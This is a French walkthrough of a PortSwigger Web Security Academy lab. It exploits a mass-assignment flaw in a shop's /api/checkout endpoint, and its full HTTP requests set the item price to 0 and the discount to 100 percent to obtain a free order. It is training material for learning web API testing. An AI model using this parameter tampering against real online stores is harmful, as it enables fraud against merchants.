# Lab

https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability

## Solution

Quand on ajoute un article à notre panier et qu'on va voir le panier, une requête `GET` est envoyée vers `/api/checkout` :

```http
GET /api/checkout HTTP/2
Host: 0af50058030cc6c38369b60700a9006c.web-security-academy.net
Cookie: session=ld6B4jz1OE6yrA49muOHJsg6XTkZPn1l
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0af50058030cc6c38369b60700a9006c.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 153

{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```

Si on essaie de lancer une requête `PATCH` pour modifier le prix de l'article ou le pourcentage de réduction, on obtient une erreur 405 car la méthode n'est pas autorisée.

On observe le même comportement avec une requête `PUT`.

Par contre avec une requête `POST` en mettant le prix à 0 on obtient une erreur nous indiquant qu'on a pas assez d'argent dans notre compte pour acheter l'article :

```http
POST /api/checkout HTTP/2
Host: 0af50058030cc6c38369b60700a9006c.web-security-academy.net
Cookie: session=ld6B4jz1OE6yrA49muOHJsg6XTkZPn1l
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0af50058030cc6c38369b60700a9006c.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Content-Length: 150

{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":0}]}
```

```http
HTTP/2 201 Created
Location: /cart?err=INSUFFICIENT_FUNDS
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

On peut essayer de modifier le paramètre `percentage` de la réduction :

```http
{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":0}]}
```

```http
HTTP/2 201 Created
Location: /cart/order-confirmation?order-confirmed=true
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

On peut donc acheter l'article pour 0$ et réussir le lab.